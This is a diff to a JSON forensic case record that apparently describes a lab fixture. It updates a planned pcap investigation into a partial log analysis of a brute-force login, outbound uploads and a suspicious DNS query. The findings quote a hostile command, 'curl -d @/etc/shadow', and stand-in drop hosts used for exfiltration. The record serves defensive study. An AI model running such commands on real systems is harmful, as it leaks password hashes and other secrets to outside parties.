@@ -2,57 +2,124 @@
   "id": "forensics02",
   "domain": "forensics-mobile",
   "route": "R26",
-  "target_type": "pcap 流量取证（本地授权样本）",
+  "target_type": "本地应用日志取证样本（UTC 时间戳 + 可疑外联/执行记录）",
   "platform": "linux",
   "protection": [],
   "authority": "local",
   "goal_level": "L2",
-  "outcome": "planned",
+  "outcome": "partial",
   "acquisition": {
-    "method": "pcap",
-    "tool": "计划：tcpdump / tshark",
-    "collected_at": "",
+    "method": "log",
+    "tool": "应用日志副本 + forensics-check.py 1.0 + grep",
+    "collected_at": "2026-10-20T04:52:07Z（日志首行，非采集时间）",
     "timezone": "UTC",
-    "operator": "",
-    "interface": "eth0",
-    "clock_skew": "unknown（尚无 pcap，未与主机日志对齐）"
+    "operator": "case fixture",
+    "clock_skew": "日志内 UTC 时间戳与文件 mtime（2026-10-21T12:38Z）不一致；未与主机/NTP 对齐"
   },
-  "artifacts": [],
+  "artifacts": [
+    {
+      "path": "input/app.log",
+      "sha256": "e0b0d9362a970a025c849f7be82cfa1dbeb516b24a304bf6dc58cd49876d0923"
+    },
+    {
+      "path": "artifacts/run.json",
+      "sha256": "fc70fb00be6f042e0b1fff203693f1c1c1cc065b48efef0784523bcd7f2d94db"
+    }
+  ],
   "evidence": [],
   "questions": [
-    "2026-10-20 05:00Z 前后，哪台主机向哪个外部端点上传了什么对象"
+    "2026-10-20 05:00Z 前后，哪个账号/源地址登录成功，向哪个外部端点上传了什么，是否执行了系统命令"
   ],
-  "timeframe": {"start": "2026-10-20T04:50:00Z", "end": "2026-10-20T05:10:00Z", "clock_skew": "unknown"},
+  "timeframe": {
+    "start": "2026-10-20T04:50:00Z",
+    "end": "2026-10-20T05:10:00Z",
+    "clock_skew": "unknown"
+  },
   "findings": [
     {
-      "claim": "待验证：HTTP 上传会话与导出对象",
-      "time_utc": "",
-      "actor": "",
-      "action": "",
-      "object": "",
-      "confidence": "unverified",
-      "evidence_refs": [],
-      "command": "python Tool/skill/forensics-mobile/scripts/forensics-check.py --file evidence/capture.pcap"
+      "claim": "同一源 198.51.100.23 对 svc-backup 连续 5 次登录失败后成功",
+      "time_utc": "2026-10-20T04:57:02Z",
+      "actor": "198.51.100.23 / svc-backup",
+      "action": "auth failed x5 then success",
+      "object": "lab-linux-02 本地账号 svc-backup",
+      "confidence": "observed-log",
+      "evidence_refs": [
+        "input/app.log",
+        "artifacts/run.json"
+      ],
+      "command": "grep -nE 'auth|outbound|exec|archive|dns' input/app.log"
+    },
+    {
+      "claim": "外联 https://drop.example.invalid/u/9f3a2c 并携带 token=Bearer abc",
+      "time_utc": "2026-10-20T04:58:44Z",
+      "actor": "lab-linux-02 / svc-backup",
+      "action": "outbound HTTP request",
+      "object": "https://drop.example.invalid/u/9f3a2c / Bearer abc",
+      "confidence": "observed-log",
+      "evidence_refs": [
+        "input/app.log",
+        "artifacts/run.json"
+      ],
+      "command": "grep -nE 'auth|outbound|exec|archive|dns' input/app.log"
+    },
+    {
+      "claim": "执行 curl 读取 /etc/shadow 并生成 /tmp/.cache/9f3a.tar.gz 归档",
+      "time_utc": "2026-10-20T05:03:55Z",
+      "actor": "lab-linux-02 / svc-backup",
+      "action": "exec curl -d @/etc/shadow; archive",
+      "object": "/etc/shadow / /tmp/.cache/9f3a.tar.gz (248192 B)",
+      "confidence": "observed-log",
+      "evidence_refs": [
+        "input/app.log",
+        "artifacts/run.json"
+      ],
+      "command": "grep -nE 'auth|outbound|exec|archive|dns' input/app.log"
+    },
+    {
+      "claim": "解析 telemetry.suspicious.invalid 的 A 记录",
+      "time_utc": "2026-10-20T05:06:10Z",
+      "actor": "lab-linux-02",
+      "action": "DNS query type=A",
+      "object": "telemetry.suspicious.invalid",
+      "confidence": "observed-log",
+      "evidence_refs": [
+        "input/app.log",
+        "artifacts/run.json"
+      ],
+      "command": "grep -nE 'auth|outbound|exec|archive|dns' input/app.log"
     }
   ],
   "tools": [
-    {"name": "tshark", "version": ""},
-    {"name": "forensics-check.py", "version": "1.0"},
-    {"name": "pcap-summary.py", "version": "1.0"}
+    {
+      "name": "forensics-check.py",
+      "version": "1.0"
+    },
+    {
+      "name": "grep",
+      "version": "GNU grep"
+    }
   ],
   "lessons": [
-    "当前状态：planned —— 未抓包，evidence/ 目录为空，无 capture.pcap 与 SHA256SUMS，findings 全部未验证",
-    "还差什么：抓取时间窗内 pcap 并算哈希、做 capinfos/会话统计、按 tcp.stream 重组导出 HTTP 对象并逐个哈希，再回填 findings",
-    "先 capinfos/会话统计，再按 tcp.stream 重组；不能只看单包",
-    "HTTP 对象导出后逐个算哈希，同名文件以 stream 建索引",
-    "时间线统一 UTC，保留 pcap 时间戳精度与丢包/截断说明",
-    "失败判据：只有单向流量、TLS 无 keylog 且无进程内明文，则标未闭环"
+    "实际分析：forensics-check.py --file input/app.log，rc=0；工具将类型判为 data/unknown，仅返回 sha256、大小和基于文件 mtime 的时间线，明确警告类型未确认；补充 grep 命中第 2–7 行。",
+    "发现：198.51.100.23 对 svc-backup 先连续失败 5 次后成功；04:58:44Z 外联 drop.example.invalid 并带 Bearer abc；05:01:19Z 执行 curl -d @/etc/shadow；05:03:55Z 生成 /tmp/.cache/9f3a.tar.gz；05:06:10Z 查询 telemetry.suspicious.invalid。",
+    "边界：只有日志单一来源，无进程树/pcap/文件哈希佐证，日志可被伪造；日志内 UTC 时间与文件 mtime 不一致，四要素只能标为 observed-log。",
+    "还差什么：采集主机进程/网络与文件哈希做交叉验证、把日志归一到 UTC 时间线、确认归档内容与上传是否成功，再决定是否升级结论。"
   ],
-  "tags": ["R26", "forensics", "pcap", "http", "timeline", "planned"],
+  "tags": [
+    "R26",
+    "forensics",
+    "log",
+    "timeline",
+    "exfil",
+    "partial"
+  ],
   "refs": [
     "Tool/skill/forensics-mobile/SKILL.md",
     "Tool/skill/forensics-mobile/references/forensics.md",
-    "Tool/skill/forensics-mobile/references/evidence-chain.md"
+    "Tool/skill/forensics-mobile/references/evidence-chain.md",
+    "Tool/config/forensics-mobile-matrix.json",
+    "Tool/cases/forensics02/input/app.log",
+    "Tool/cases/forensics02/artifacts/run.json"
   ],
-  "updated": "2026-10-20"
+  "updated": "2026-10-21"
 }
